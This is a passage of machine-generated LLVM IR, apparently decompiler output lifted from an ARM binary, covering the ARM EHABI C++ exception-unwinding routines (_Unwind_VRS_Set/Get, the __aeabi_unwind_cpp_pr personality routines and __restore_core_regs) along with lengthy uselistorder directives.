  %v3_18b68 = load i32, i32* %v2_18b68, align 4
  %v1_18b6c = load i32, i32* @r7, align 4
  %v9_18b6c = icmp eq i32 %v3_18b68, %v1_18b6c
  br i1 %v9_18b6c, label %dec_label_pc_18b74, label %dec_label_pc_18abc

dec_label_pc_18b74:                               ; preds = %dec_label_pc_18b68
  %v1_18b74 = inttoptr i32 %v3_18b68 to i32*
  %v2_18b74 = load i32, i32* %v1_18b74, align 4
  %v1_18b78 = and i32 %v2_18b74, 1073741824
  %v2_18b78 = icmp eq i32 %v1_18b78, 0
  br i1 %v2_18b78, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_18b74
  %v2_18b7c = or i32 %v2_18b74, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_18b74
  %tmp208 = bitcast i32 %v2_18b74 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_18b80 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_18b84 = phi i32 [ %v2_18cb4, %.thread28 ], [ %v2_18cb4, %bb169 ], [ %v3_18b68, %bb165 ], [ %v3_18b68, %.thread26 ]
  %v0_18b84 = phi i32 [ %v2_18cc4, %.thread28 ], [ %v2_18cc0, %bb169 ], [ %v2_18b7c, %bb165 ], [ %v2_18b80, %.thread26 ]
  %v2_18b84 = add i32 %v0_18b84, %v1_18b84
  store i32 %v2_18b84, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18b9c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18b9c, i32* %r0.global-to-local, align 4
  %v5_18ba4 = call i32 @_Unwind_VRS_Set(i32 %v0_18b9c, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_18b9c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18bbc = load i32, i32* @r8, align 4
  store i32 %v0_18bbc, i32* %stack_var_-48, align 4
  %v5_18bc4 = call i32 @_Unwind_VRS_Set(i32 %v0_18b9c, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18978

dec_label_pc_18bd0:                               ; preds = %dec_label_pc_18b04
  %v0_18bd0 = load i32, i32* @r8, align 4
  %v1_18bd0 = add i32 %v0_18bd0, 40
  %v2_18bd0 = inttoptr i32 %v1_18bd0 to i32*
  %v3_18bd0 = load i32, i32* %v2_18bd0, align 4
  %v1_18bd4 = load i32, i32* @r7, align 4
  %v9_18bd4 = icmp eq i32 %v3_18bd0, %v1_18bd4
  br i1 %v9_18bd4, label %dec_label_pc_18bdc, label %dec_label_pc_18b30

dec_label_pc_18bdc:                               ; preds = %dec_label_pc_18bd0
  %v1_18be0 = add i32 %v3_18bd0, 4
  store i32 %v1_18be0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_18be8 = add i32 %v0_18bd0, 44
  %v3_18be8 = inttoptr i32 %v2_18be8 to i32*
  store i32 0, i32* %v3_18be8, align 4
  %v0_18bec = load i32, i32* %r2.global-to-local, align 4
  %v1_18bec = load i32, i32* @r8, align 4
  %v2_18bec = add i32 %v1_18bec, 48
  %v3_18bec = inttoptr i32 %v2_18bec to i32*
  store i32 %v0_18bec, i32* %v3_18bec, align 4
  %v0_18bf0 = load i32, i32* @sl, align 4
  %v1_18bf0 = load i32, i32* @r8, align 4
  %v2_18bf0 = add i32 %v1_18bf0, 40
  %v3_18bf0 = inttoptr i32 %v2_18bf0 to i32*
  store i32 %v0_18bf0, i32* %v3_18bf0, align 4
  %v0_18bf4 = load i32, i32* %r0.global-to-local, align 4
  %v1_18bf4 = load i32, i32* @r8, align 4
  %v2_18bf4 = add i32 %v1_18bf4, 52
  %v3_18bf4 = inttoptr i32 %v2_18bf4 to i32*
  store i32 %v0_18bf4, i32* %v3_18bf4, align 4
  %v0_18bf8 = load i32, i32* @r7, align 4
  %v1_18bf8 = inttoptr i32 %v0_18bf8 to i32*
  %v2_18bf8 = load i32, i32* %v1_18bf8, align 4
  %v1_18bfc = icmp slt i32 %v2_18bf8, 0
  br i1 %v1_18bfc, label %dec_label_pc_18c04, label %dec_label_pc_18cb0

dec_label_pc_18c04:                               ; preds = %dec_label_pc_18bdc
  %v0_18c04 = load i32, i32* %r2.global-to-local, align 4
  %v1_18c04 = add i32 %v0_18c04, -3
  store i32 %v1_18c04, i32* %r2.global-to-local, align 4
  %v0_18c08 = load i32, i32* %r0.global-to-local, align 4
  %v1_18c08 = add i32 %v0_18c08, 4
  store i32 %v1_18c08, i32* @r6, align 4
  br label %dec_label_pc_18af8

dec_label_pc_18c14:                               ; preds = %dec_label_pc_18a24, %dec_label_pc_18ab0, %dec_label_pc_189dc, %dec_label_pc_189b0.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18c24 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18c24, i32* %r0.global-to-local, align 4
  %v5_18c2c = call i32 @_Unwind_VRS_Get(i32 %v0_18c24, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18c30 = load i32, i32* @r7, align 4
  %v1_18c30 = load i32, i32* @r8, align 4
  %v2_18c30 = add i32 %v1_18c30, 40
  %v3_18c30 = inttoptr i32 %v2_18c30 to i32*
  store i32 %v0_18c30, i32* %v3_18c30, align 4
  %v3_18c34 = load i32, i32* %stack_var_-48, align 4
  %v3_18c38 = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_18c38, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_18c40 = load i32, i32* @r8, align 4
  %v2_18c40 = add i32 %v1_18c40, 32
  %v3_18c40 = inttoptr i32 %v2_18c40 to i32*
  store i32 %v3_18c34, i32* %v3_18c40, align 4
  %v0_18c44 = load i32, i32* %r2.global-to-local, align 4
  %v1_18c44 = load i32, i32* @r8, align 4
  %v2_18c44 = add i32 %v1_18c44, 36
  %v3_18c44 = inttoptr i32 %v2_18c44 to i32*
  store i32 %v0_18c44, i32* %v3_18c44, align 4
  %v1_18980.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18978

dec_label_pc_18c4c:                               ; preds = %bb155
  %v1_18c4c = inttoptr i32 %v0_188d4 to i32*
  %v2_18c4c = load i32, i32* %v1_18c4c, align 4
  %v1_18c50 = add i32 %v0_188d4, 4
  %v1_18c54 = and i32 %v2_18c4c, 1073741824
  %v2_18c54 = icmp eq i32 %v1_18c54, 0
  %v2_18c58 = or i32 %v2_18c4c, -2147483648
  %tmp210 = bitcast i32 %v2_18c4c to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_18c5c = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_18c54, i32 %v2_18c5c, i32 %v2_18c58
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_18c60 = load i32, i32* @r8, align 4
  %v2_18c60 = add i32 %v1_18c60, 56
  %v3_18c60 = inttoptr i32 %v2_18c60 to i32*
  store i32 %v1_18c50, i32* %v3_18c60, align 4
  %v0_18c64 = load i32, i32* @r8, align 4
  store i32 %v0_18c64, i32* %r0.global-to-local, align 4
  %v4_18c70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 32) to i32*), align 4
  store i32 101500, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18c70)
  %v0_18c7c = load i32, i32* %r0.global-to-local, align 4
  %v2_18c7c = icmp eq i32 %v0_18c7c, 0
  br i1 %v2_18c7c, label %dec_label_pc_18974, label %dec_label_pc_18c84

dec_label_pc_18c84:                               ; preds = %dec_label_pc_18c4c
  %v0_18c84 = load i32, i32* %r4.global-to-local, align 4
  %v1_18c84 = load i32, i32* @r7, align 4
  %v2_18c84 = add i32 %v1_18c84, %v0_18c84
  store i32 %v2_18c84, i32* %stack_var_-48, align 4
  %v0_18c94 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18c94, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_18ca4 = call i32 @_Unwind_VRS_Set(i32 %v0_18c94, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18978

dec_label_pc_18cb0:                               ; preds = %dec_label_pc_18bdc
  %v0_18cb0 = load i32, i32* @sl, align 4
  %v3_18cb0 = mul i32 %v0_18cb0, 4
  %v0_18cb4 = load i32, i32* %r0.global-to-local, align 4
  %v2_18cb4 = add i32 %v0_18cb4, %v3_18cb0
  %v3_18cb4 = inttoptr i32 %v2_18cb4 to i32*
  %v4_18cb4 = load i32, i32* %v3_18cb4, align 4
  %v1_18cb8 = and i32 %v4_18cb4, 1073741824
  %v2_18cb8 = icmp eq i32 %v1_18cb8, 0
  br i1 %v2_18cb8, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_18cb0
  %v2_18cc0 = or i32 %v4_18cb4, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_18cb0
  %tmp212 = bitcast i32 %v4_18cb4 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_18cc4 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_18cb4, { 2, 1, 0 }
  uselistorder i32 %v1_18c08, { 1, 0 }
  uselistorder i32 %v1_18c04, { 1, 0 }
  uselistorder i32 %v1_18bd4, { 1, 0 }
  uselistorder i32 %v0_18b9c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_18b68, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18b30, { 1, 0 }
  uselistorder i32 %v0_18b30, { 1, 0 }
  uselistorder i32 %v2_1882466, { 1, 0 }
  uselistorder i32 %v2_18afc, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_18824, { 1, 0 }
  uselistorder i32 %v1_18abc, { 1, 0 }
  uselistorder i32 %v3_18a58, { 2, 0, 1 }
  uselistorder i32 %v0_18a38, { 1, 0 }
  uselistorder i32 %v0_18a38.pre, { 1, 0 }
  uselistorder i32 %v1_18990, { 1, 0 }
  uselistorder i32 %v2_18988, { 1, 0 }
  uselistorder i32 %v0_18918, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_188d8, { 1, 0 }
  uselistorder i32 %v1_188d4, { 1, 0 }
  uselistorder i32 %v0_188d4, { 1, 0, 2 }
  uselistorder i32 %v4_188ac, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18a50, { 1, 2, 0 }
  uselistorder i32 %v0_18884, { 1, 0 }
  uselistorder i32 %v3_18880, { 1, 0, 2 }
  uselistorder i32 %v1_18854, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_18a8c, { 1, 0 }
  uselistorder i1 %v2_188c0, { 1, 0, 2 }
  uselistorder i32 %v1_187c4, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 20, 0, 5, 12, 13, 4, 10, 11, 15, 16, 17, 18, 6, 7, 14, 3, 1, 8, 19, 2, 9 }
  uselistorder i32 -3, { 2, 3, 0, 1, 4, 6, 5 }
  uselistorder i32 52, { 24, 2, 3, 1, 23, 14, 8, 5, 12, 13, 22, 20, 4, 21, 0, 18, 19, 6, 7, 10, 16, 11, 9, 17, 15 }
  uselistorder i32 48, { 45, 8, 9, 35, 6, 10, 1, 27, 11, 31, 32, 28, 29, 12, 2, 39, 13, 40, 41, 4, 14, 42, 15, 43, 16, 17, 18, 5, 0, 19, 20, 21, 3, 22, 23, 24, 25, 7, 26, 36, 37, 38, 34, 44, 30, 33 }
  uselistorder i32 44, { 32, 5, 6, 30, 31, 7, 1, 33, 34, 0, 2, 3, 4, 24, 29, 25, 26, 27, 28, 21, 22, 23, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 10 }
  uselistorder i32 -2147483648, { 22, 23, 24, 25, 26, 27, 28, 29, 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 2, 18, 19, 20, 21 }
  uselistorder i32 1073741824, { 6, 7, 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 65536, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 13, 12, 18, 14, 19, 15, 20, 16, 21, 17, 22, 23, 24, 28, 25, 29, 26, 30, 27, 31, 33, 32, 34, 41, 35, 36, 37, 38, 39, 40 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 108) to i32*), { 1, 0 }
  uselistorder i32 88, { 11, 12, 9, 0, 10, 7, 8, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_23104.179 to i32), { 44, 7, 45, 46, 8, 9, 88, 118, 119, 89, 90, 91, 120, 10, 11, 92, 121, 2, 122, 123, 124, 125, 126, 127, 3, 4, 0, 5, 93, 94, 128, 12, 95, 129, 13, 14, 15, 16, 17, 130, 43, 22, 24, 19, 20, 23, 18, 21, 131, 25, 132, 133, 134, 26, 96, 135, 136, 27, 28, 29, 137, 138, 30, 139, 31, 140, 141, 142, 97, 143, 32, 144, 6, 98, 145, 99, 146, 100, 147, 33, 148, 149, 34, 35, 102, 150, 151, 152, 153, 154, 155, 56, 55, 57, 156, 47, 81, 77, 75, 74, 76, 78, 79, 80, 73, 82, 68, 70, 69, 67, 66, 71, 72, 63, 62, 65, 64, 61, 60, 59, 58, 104, 83, 103, 84, 48, 85, 101, 105, 157, 106, 107, 158, 108, 36, 37, 159, 109, 160, 110, 161, 38, 162, 112, 111, 54, 51, 52, 53, 50, 39, 86, 49, 87, 40, 41, 113, 114, 115, 163, 42, 164, 165, 166, 1, 116, 117 }
  uselistorder i32 -2, { 0, 26, 27, 9, 10, 11, 12, 2, 4, 5, 3, 13, 14, 15, 1, 6, 8, 7, 16, 24, 20, 21, 22, 23, 18, 17, 25, 19 }
  uselistorder i32 80, { 10, 11, 12, 6, 4, 5, 1, 2, 0, 3, 7, 8, 9 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18c14, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18b30, { 1, 0 }
  uselistorder label %dec_label_pc_18af8, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18abc, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_18a38, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_18978, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_18974, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_188d4, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_18830, { 1, 0 }
  uselistorder label %dec_label_pc_18830.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18830.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_18cd0(i32 %arg1) local_unnamed_addr {
dec_label_pc_18cd0:
  %v0_18cd0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18cd0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18cd0
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18cd0, %bb
  %v4_18cd8 = phi i32 [ %arg1, %dec_label_pc_18cd0 ], [ 0, %bb ]
  ret i32 %v4_18cd8

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 43, 15, 16, 13, 17, 56, 57, 58, 59, 60, 61, 10, 11, 14, 62, 63, 64, 12, 44, 39, 45, 46, 47, 48, 49, 6, 18, 19, 40, 4, 34, 65, 3, 25, 26, 27, 50, 20, 24, 51, 52, 53, 54, 55, 36, 5, 7, 66, 21, 22, 41, 42, 28, 29, 23, 32, 31, 30, 33, 8, 9, 38, 35, 37, 67, 68, 69, 70 }
  uselistorder i1* @cpsr_z, { 0, 1, 44, 39, 45, 46, 47, 48, 49, 50, 51, 52, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 53, 15, 16, 17, 18, 19, 20, 21, 22, 40, 41, 42, 43, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18ce0 = load i32, i32* @r1, align 4
  %v2_18ce0 = load i32, i32* @r2, align 4
  %v4_18ce0 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_18ce0, i32 %v2_18ce0, i32 2)
  ret i32 %v4_18ce0
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18ce8 = load i32, i32* @r1, align 4
  %v2_18ce8 = load i32, i32* @r2, align 4
  %v4_18ce8 = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_18ce8, i32 %v2_18ce8, i32 1)
  ret i32 %v4_18ce8
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18cf0 = load i32, i32* @r1, align 4
  %v2_18cf0 = load i32, i32* @r2, align 4
  %v4_18cf0 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_18cf0, i32 %v2_18cf0, i32 0)
  ret i32 %v4_18cf0

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 12, 11, 10, 101, 16, 57, 58, 59, 60, 1, 61, 62, 63, 64, 65, 66, 9, 67, 29, 30, 31, 13, 32, 33, 34, 35, 36, 46, 47, 48, 49, 50, 51, 41, 14, 68, 69, 17, 18, 19, 20, 102, 52, 53, 54, 21, 15, 8, 103, 104, 105, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 0, 106, 107, 108, 109, 110, 111, 112, 113, 114, 119, 120, 121, 122, 115, 2, 116, 117, 118, 37, 38, 3, 4, 5, 39, 40, 6, 7, 55, 22, 84, 85, 86, 87, 88, 89, 90, 92, 91, 93, 94, 95, 96, 42, 43, 44, 97, 98, 23, 99, 45, 24, 25, 26, 27, 28, 56, 100 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_18cf8 = add i32 %tmp, 56
  %v4_18cf8 = inttoptr i32 %v3_18cf8 to i32*
  %v5_18cf8 = load i32, i32* %v4_18cf8, align 4
  %v6_18cf8 = add i32 %tmp, 60
  %v7_18cf8 = inttoptr i32 %v6_18cf8 to i32*
  %v8_18cf8 = load i32, i32* %v7_18cf8, align 4
  %v2_18d04 = load i32, i32* %arg1, align 4
  %v3_18d04 = add i32 %tmp, 4
  %v4_18d04 = inttoptr i32 %v3_18d04 to i32*
  %v5_18d04 = load i32, i32* %v4_18d04, align 4
  store i32 %v5_18d04, i32* @r1, align 4
  %v12_18d04 = add i32 %tmp, 16
  %v13_18d04 = inttoptr i32 %v12_18d04 to i32*
  %v14_18d04 = load i32, i32* %v13_18d04, align 4
  store i32 %v14_18d04, i32* @r4, align 4
  %v15_18d04 = add i32 %tmp, 20
  %v16_18d04 = inttoptr i32 %v15_18d04 to i32*
  %v17_18d04 = load i32, i32* %v16_18d04, align 4
  store i32 %v17_18d04, i32* @r5, align 4
  %v18_18d04 = add i32 %tmp, 24
  %v19_18d04 = inttoptr i32 %v18_18d04 to i32*
  %v20_18d04 = load i32, i32* %v19_18d04, align 4
  store i32 %v20_18d04, i32* @r6, align 4
  %v21_18d04 = add i32 %tmp, 28
  %v22_18d04 = inttoptr i32 %v21_18d04 to i32*
  %v23_18d04 = load i32, i32* %v22_18d04, align 4
  store i32 %v23_18d04, i32* @r7, align 4
  %v24_18d04 = add i32 %tmp, 32
  %v25_18d04 = inttoptr i32 %v24_18d04 to i32*
  %v26_18d04 = load i32, i32* %v25_18d04, align 4
  store i32 %v26_18d04, i32* @r8, align 4
  %v27_18d04 = add i32 %tmp, 36
  %v28_18d04 = inttoptr i32 %v27_18d04 to i32*
  %v29_18d04 = load i32, i32* %v28_18d04, align 4
  store i32 %v29_18d04, i32* @sb, align 4
  %v30_18d04 = add i32 %tmp, 40
  %v31_18d04 = inttoptr i32 %v30_18d04 to i32*
  %v32_18d04 = load i32, i32* %v31_18d04, align 4
  store i32 %v32_18d04, i32* @sl, align 4
  store i32 %v8_18cf8, i32* @ip, align 4
  store i32 %v5_18cf8, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_18cf8)
  ret i32 %v2_18d04

; uselistorder directives
  uselistorder i32 %v8_18cf8, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 147, 148, 149, 10, 150, 112, 18, 19, 20, 113, 114, 115, 116, 117, 118, 119, 24, 25, 26, 27, 28, 33, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 11, 51, 52, 53, 54, 55, 56, 57, 64, 69, 70, 71, 72, 78, 79, 77, 80, 4, 81, 5, 82, 83, 84, 85, 120, 21, 22, 6, 153, 151, 152, 35, 93, 94, 108, 109, 110, 31, 9, 32, 154, 122, 121, 0, 123, 124, 1, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 7, 188, 189, 190, 191, 192, 193, 194, 195, 196, 125, 126, 127, 128, 197, 198, 129, 130, 199, 200, 73, 74, 12, 86, 87, 88, 89, 8, 90, 91, 92, 58, 59, 60, 61, 62, 63, 75, 76, 111, 65, 66, 29, 30, 131, 133, 132, 2, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 204, 201, 202, 203, 3, 205, 13, 14, 135, 136, 137, 138, 139, 140, 141, 142, 134, 143, 144, 145, 67, 68, 146, 15, 16, 23, 17 }
  uselistorder i32 40, { 24, 20, 21, 22, 23, 8, 9, 12, 14, 7, 25, 2, 4, 5, 13, 1, 11, 6, 3, 10, 0, 15, 16, 17, 18, 19 }
  uselistorder i32* @sb, { 75, 12, 13, 14, 15, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 43, 31, 32, 33, 1, 34, 44, 45, 46, 47, 48, 49, 50, 51, 52, 58, 59, 5, 6, 7, 76, 77, 60, 61, 62, 63, 64, 65, 66, 16, 17, 18, 19, 8, 9, 35, 36, 37, 38, 39, 40, 41, 42, 53, 56, 54, 55, 57, 2, 10, 11, 67, 68, 69, 70, 71, 72, 73, 0, 74, 3, 4 }
  uselistorder i32 36, { 23, 22, 6, 4, 11, 12, 15, 16, 17, 18, 19, 13, 7, 10, 8, 24, 1, 5, 14, 9, 0, 2, 3, 20, 21 }
  uselistorder i32* @r8, { 165, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 3, 164, 44, 45, 46, 47, 48, 49, 54, 55, 9, 56, 57, 58, 59, 60, 61, 62, 63, 64, 71, 77, 91, 92, 97, 102, 103, 104, 4, 105, 106, 107, 108, 109, 123, 23, 24, 25, 166, 167, 124, 125, 126, 127, 128, 129, 130, 131, 132, 0, 133, 134, 50, 51, 52, 53, 26, 27, 28, 10, 11, 29, 30, 31, 17, 18, 5, 19, 72, 73, 6, 74, 75, 76, 110, 111, 112, 113, 114, 8, 115, 116, 117, 118, 119, 120, 121, 122, 36, 37, 38, 39, 98, 99, 100, 101, 93, 94, 95, 96, 12, 13, 14, 32, 33, 34, 35, 78, 79, 80, 81, 135, 136, 137, 138, 139, 140, 141, 2, 142, 1, 143, 144, 145, 146, 20, 21, 82, 83, 84, 85, 86, 87, 88, 89, 90, 15, 65, 7, 66, 67, 68, 69, 70, 40, 41, 42, 43, 16, 22 }
  uselistorder i32 32, { 89, 25, 86, 87, 88, 64, 65, 66, 67, 18, 19, 27, 39, 40, 21, 22, 68, 20, 28, 69, 70, 71, 72, 26, 73, 45, 47, 48, 59, 60, 30, 62, 49, 50, 41, 42, 90, 36, 91, 17, 35, 92, 11, 46, 63, 29, 23, 74, 31, 13, 75, 76, 32, 37, 51, 52, 33, 53, 54, 1, 2, 4, 3, 61, 24, 57, 55, 56, 77, 78, 12, 79, 0, 34, 80, 81, 82, 83, 84, 85, 14, 43, 44, 58, 6, 5, 8, 7, 15, 16, 10, 9, 38 }
  uselistorder i32 28, { 51, 24, 4, 7, 26, 5, 29, 6, 30, 35, 37, 38, 8, 39, 9, 36, 10, 11, 31, 41, 25, 12, 18, 13, 52, 19, 53, 54, 55, 56, 23, 40, 14, 1, 42, 15, 20, 16, 2, 21, 27, 28, 3, 32, 33, 43, 44, 45, 46, 47, 48, 49, 0, 50, 22, 34, 17 }
  uselistorder i32 24, { 49, 48, 19, 23, 25, 26, 0, 36, 4, 38, 27, 28, 10, 11, 50, 5, 6, 51, 24, 37, 1, 31, 32, 33, 20, 21, 39, 7, 22, 12, 13, 14, 3, 8, 15, 16, 18, 29, 30, 2, 34, 40, 41, 42, 43, 44, 45, 46, 47, 17, 35, 9 }
  uselistorder i32 20, { 53, 51, 52, 54, 2, 6, 11, 7, 35, 36, 3, 9, 41, 0, 44, 37, 38, 17, 18, 55, 19, 56, 57, 58, 34, 59, 10, 60, 61, 4, 62, 42, 12, 45, 46, 31, 32, 33, 20, 13, 21, 22, 1, 63, 24, 25, 26, 27, 28, 29, 30, 14, 39, 40, 5, 8, 47, 48, 49, 50, 23, 43, 15, 16 }
  uselistorder i32* @r1, { 310, 24, 23, 22, 4, 311, 235, 236, 26, 237, 238, 239, 240, 241, 25, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 63, 64, 27, 65, 66, 253, 5, 254, 255, 256, 257, 258, 259, 260, 21, 261, 262, 263, 264, 312, 313, 28, 107, 108, 110, 111, 112, 127, 29, 30, 36, 128, 129, 130, 314, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 148, 149, 150, 151, 152, 153, 157, 159, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 203, 204, 6, 207, 208, 209, 210, 17, 67, 68, 211, 213, 212, 31, 214, 215, 216, 217, 218, 219, 160, 161, 265, 71, 73, 69, 2, 316, 70, 315, 124, 125, 220, 221, 223, 229, 230, 231, 232, 233, 75, 32, 113, 1, 114, 115, 33, 317, 34, 266, 267, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 8, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 7, 359, 360, 35, 162, 167, 168, 169, 116, 117, 118, 119, 120, 121, 268, 270, 271, 38, 272, 273, 274, 275, 276, 277, 278, 284, 285, 279, 280, 281, 282, 39, 286, 9, 287, 40, 126, 3, 122, 123, 41, 72, 74, 42, 361, 362, 363, 43, 364, 365, 366, 367, 288, 44, 53, 368, 45, 54, 62, 146, 147, 222, 10, 154, 155, 11, 156, 205, 12, 206, 104, 200, 234, 173, 174, 175, 46, 109, 47, 289, 290, 291, 48, 224, 225, 226, 227, 228, 13, 201, 202, 18, 98, 99, 158, 14, 55, 56, 57, 58, 59, 60, 61, 15, 369, 370, 371, 372, 0, 373, 49, 37, 292, 16, 293, 294, 50, 163, 164, 165, 166, 76, 77, 78, 170, 171, 172, 79, 80, 81, 82, 295, 296, 297, 19, 299, 300, 301, 302, 303, 304, 305, 306, 307, 51, 298, 20, 283, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 308, 83, 309, 145, 84, 85, 269, 52, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 100, 101, 102, 103, 105, 106 }
  uselistorder i32 60, { 2, 27, 28, 29, 25, 26, 3, 17, 18, 4, 5, 1, 6, 7, 0, 21, 22, 13, 14, 23, 24, 15, 16, 8, 11, 12, 9, 19, 20, 10 }
